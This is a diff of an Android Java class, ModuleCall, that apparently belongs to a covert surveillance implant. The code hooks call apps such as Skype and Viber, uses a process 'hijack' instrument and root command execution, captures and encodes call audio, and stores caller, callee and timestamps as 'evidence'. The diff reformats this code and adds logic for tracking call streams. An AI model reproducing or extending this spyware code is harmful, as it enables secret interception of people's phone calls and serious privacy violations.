@@ -9,18 +9,6 @@
 
 package com.android.dvci.module;
 
-import java.io.ByteArrayOutputStream;
-import java.io.File;
-import java.io.FilenameFilter;
-import java.io.IOException;
-import java.util.ArrayList;
-import java.util.Collections;
-import java.util.Comparator;
-import java.util.Date;
-import java.util.List;
-import java.util.concurrent.BlockingQueue;
-import java.util.concurrent.LinkedBlockingQueue;
-
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.content.pm.PackageManager.NameNotFoundException;
@@ -33,21 +21,17 @@ import com.android.dvci.auto.Cfg;
 import com.android.dvci.conf.ConfModule;
 import com.android.dvci.conf.Configuration;
 import com.android.dvci.conf.ConfigurationException;
-import com.android.dvci.db.GenericSqliteHelper;
 import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.evidence.EvidenceType;
 import com.android.dvci.file.AutoFile;
 import com.android.dvci.interfaces.Observer;
 import com.android.dvci.listener.ListenerCall;
-import com.android.dvci.listener.ListenerProcess;
 import com.android.dvci.manager.ManagerModule;
 import com.android.dvci.module.ModuleDevice.PInfo;
 import com.android.dvci.module.call.CallInfo;
 import com.android.dvci.module.call.Chunk;
 import com.android.dvci.module.call.EncodingTask;
 import com.android.dvci.module.call.RecordCall;
-import com.android.dvci.module.chat.ChatSkype;
-import com.android.dvci.module.chat.ChatViber;
 import com.android.dvci.util.AudioEncoder;
 import com.android.dvci.util.ByteArray;
 import com.android.dvci.util.CallBack;
@@ -60,6 +44,18 @@ import com.android.dvci.util.Instrument;
 import com.android.dvci.util.Utils;
 import com.android.dvci.util.WChar;
 import com.android.mm.M;
+
+import java.io.ByteArrayOutputStream;
+import java.io.File;
+import java.io.FilenameFilter;
+import java.io.IOException;
+import java.util.ArrayList;
+import java.util.Collections;
+import java.util.Comparator;
+import java.util.Date;
+import java.util.List;
+import java.util.concurrent.BlockingQueue;
+import java.util.concurrent.LinkedBlockingQueue;
 
 public class ModuleCall extends BaseModule implements Observer<Call> {
 	private static final String TAG = "ModuleCall"; //$NON-NLS-1$
@@ -80,7 +76,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	private static final int AUDIO_STREAM_RING = 2;
 	private static final int AUDIO_STREAM_MUSIC = 3;
 	private static final int AUDIO_STREAM_MIC = -2; // Defined by us, not by
-													// Android
+	// Android
 
 	private FileObserver observer;
 	private Thread queueMonitor;
@@ -90,10 +86,10 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	private CallBack hjcb;
 	private Instrument hijack;
 
-	public static final byte[] AMR_HEADER = new byte[] { 35, 33, 65, 77, 82, 10 };
-	public static final byte[] MP4_HEADER = new byte[] { 0, 0, 0 };
+	public static final byte[] AMR_HEADER = new byte[]{35, 33, 65, 77, 82, 10};
+	public static final byte[] MP4_HEADER = new byte[]{0, 0, 0};
 
-	int amr_sizes[] = { 12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5, 5, 0, 0, 0, 0 };
+	int amr_sizes[] = {12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5, 5, 0, 0, 0, 0};
 	private RunningProcesses runningProcesses;
 	private CallInfo callInfo;
 	private List<Chunk> chunks = new ArrayList<Chunk>();
@@ -162,7 +158,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			if (audioStorageOk) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + "(actualStart): starting audio storage management");
-					Execute.execute(new String[] { "touch", "/sdcard/1" });
+					Execute.execute(new String[]{"touch", "/sdcard/1"});
 					Execute.executeRoot("touch /sdcard/2");
 				}
 
@@ -175,7 +171,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 					}
 					startWatchAudio();
 					canRecord = true;
-				}else{
+				} else {
 					canRecord = false;
 				}
 			} else {
@@ -189,7 +185,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 	private boolean installedWhitelist() {
 
-		String[] whitelist = new String[] { "com.viber.voip", "com.skype.raider" };
+		String[] whitelist = new String[]{"com.viber.voip", "com.skype.raider"};
 
 		final ArrayList<PInfo> res = new ArrayList<PInfo>();
 		final PackageManager packageManager = Status.getAppContext().getPackageManager();
@@ -462,7 +458,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	}
 
 	public boolean saveCallEvidence(String peer, String myNumber, boolean incoming, Date dateBegin, Date dateEnd,
-			String currentRecordFile, boolean autoClose, int channel, int programId) {
+	                                String currentRecordFile, boolean autoClose, int channel, int programId) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (saveCallEvidence): " + " peer: " + peer + " from: " + dateBegin + " to: " + dateEnd
 					+ " incoming: " + incoming);
@@ -522,7 +518,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	}
 
 	private void closeCallEvidence(String peer, String number, boolean incoming, Date dateBegin, Date dateEnd,
-			int programId) {
+	                               int programId) {
 		final byte[] additionaldata = getCallAdditionalData(peer, number, incoming, new DateTime(dateBegin),
 				new DateTime(dateEnd), CHANNEL_LOCAL, programId);
 
@@ -553,7 +549,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	}
 
 	private byte[] getCallAdditionalData(String peer, String myNumber, boolean incoming, DateTime dateBegin,
-			DateTime dateEnd, int channels, int programId) {
+	                                     DateTime dateEnd, int channels, int programId) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (getCallAdditionalData): caller: " + peer + " callee: " + myNumber);
 		}
@@ -608,7 +604,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	}
 
 	private void saveCalllistEvidence(int programId, String from, String to, boolean incoming, Date fromTime,
-			int duration) {
+	                                  int duration) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (saveCalllistEvidence):  from: " + from + " to: " + to);
 		}
@@ -688,12 +684,30 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 		long streamId = getStreamId(encodedFile);
 		int pid = getStreamPid(encodedFile);
+
+		long oldStreamId = callInfo.getStreamId(remote);
+
+		if (oldStreamId != 0 && streamId != oldStreamId  ||  finished[remote?1:0] ) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (encodeChunks), if remote not closed, delete previous stream");
+			}
+			// close oldStream
+			if (callInfo.begin != null && callInfo.end != null) {
+				closeCallEvidence(callInfo.getCaller(), callInfo.getCallee(), true, callInfo.begin, callInfo.end, callInfo.programId);
+			}
+
+			callInfo = new CallInfo();
+			chunks = new ArrayList<Chunk>();
+			finished = new boolean[2];
+			started = false;
+		}
+
 		boolean ret = callInfo.setStreamId(remote, streamId);
 		ret = callInfo.setStreamPid(pid);
 
 		if (!callInfo.update(false)) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (encodeChunks): unknown call program removing" + (remote ? "Remote":"local"));
+				Check.log(TAG + " (encodeChunks): unknown call program removing" + (remote ? "Remote" : "local"));
 			}
 
 			return;
@@ -714,8 +728,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		}
 
 		if (audioEncoder.encodetoAmr(encodedFile, audioEncoder.resample(realRate))) {
-			Date begin = new Date(first_epoch * 1000L);
-			Date end = new Date(last_epoch * 1000L);
+			callInfo.begin = new Date(first_epoch * 1000L);
+			callInfo.end = new Date(last_epoch * 1000L);
 
 			finished[remote ? 1 : 0] = false;
 
@@ -724,9 +738,9 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 			if (callInfo.delay) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (encodeChunks) delay, just add a chunk: " + chunks.size() +"monitored caller:" + caller+" monitored callee:" + callee);
+					Check.log(TAG + " (encodeChunks) delay, just add a chunk: " + chunks.size() + "monitored caller:" + caller + " monitored callee:" + callee);
 				}
-				chunks.add(new Chunk(encodedFile, begin, end, remote));
+				chunks.add(new Chunk(encodedFile, callInfo.begin, callInfo.end, remote));
 				sort_chunks();
 			} else {
 				// Encode to evidence
@@ -735,9 +749,9 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				if (!started) {
 					if (remote) {
 						if (Cfg.DEBUG) {
-							Check.log(TAG + " (encodeChunks): saving, possibly discarted, remote: " + begin);
+							Check.log(TAG + " (encodeChunks): saving, possibly discarted, remote: " + callInfo.begin);
 						}
-						chunks.add(new Chunk(encodedFile, begin, end, remote));
+						chunks.add(new Chunk(encodedFile, callInfo.begin, callInfo.end, remote));
 						sort_chunks();
 					} else {
 						if (Cfg.DEBUG) {
@@ -745,7 +759,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 						}
 						started = true;
 
-						Chunk firstl = new Chunk(encodedFile, begin, end, remote);
+						Chunk firstl = new Chunk(encodedFile, callInfo.begin, callInfo.end, remote);
 						chunks.add(firstl);
 						sort_chunks();
 
@@ -754,7 +768,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 								AutoFile filetmp = new AutoFile(encodedFile);
 								filetmp.delete();
 								if (Cfg.DEBUG) {
-									Check.log(TAG + " (encodeChunks):removing old LOCAL chunk !! :"+filetmp.getName() + " StreamId:" +streamId);
+									Check.log(TAG + " (encodeChunks):removing old LOCAL chunk !! :" + filetmp.getName() + " StreamId:" + streamId);
 								}
 							} else {
 								saveCallEvidence(caller, callee, chunk, callInfo.programId);
@@ -764,7 +778,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 					}
 				} else {
-					saveCallEvidence(caller, callee, true, begin, end, encodedFile, false, channel, callInfo.programId);
+					saveCallEvidence(caller, callee, true, callInfo.begin, callInfo.end, encodedFile, false, channel, callInfo.programId);
 				}
 			}
 
@@ -778,10 +792,10 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				if ((finished[0] && finished[1])) {
 					// After encoding create the end of call marker
 					if (callInfo.delay) {
-						saveAllEvidences(chunks, callInfo, begin, end);
+						saveAllEvidences(chunks, callInfo, callInfo.begin, callInfo.end);
 					} else {
 						if (callInfo.valid)
-							closeCallEvidence(caller, callee, true, begin, end, callInfo.programId);
+							closeCallEvidence(caller, callee, true, callInfo.begin, callInfo.end, callInfo.programId);
 					}
 					callInfo = new CallInfo();
 					chunks = new ArrayList<Chunk>();
@@ -797,7 +811,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 		// Remove file
 		if (Cfg.DEBUG) {
-			 Check.log(TAG + "(encodeChunks): deleting " + file.getName());
+			Check.log(TAG + "(encodeChunks): deleting " + file.getName());
 		}
 
 		audioEncoder.removeRawFile();
@@ -815,12 +829,13 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		}
 		return streamId;
 	}
+
 	private int getStreamPid(String fullName) {
 
 		// Stored filetime (unix epoch() is in seconds not ms)
 		String split[] = fullName.split("-");
-		int streamPid =0;
-		if(split.length>4) {
+		int streamPid = 0;
+		if (split.length > 4) {
 			streamPid = Integer.parseInt(split[3]);
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getStreamPid): " + streamPid);
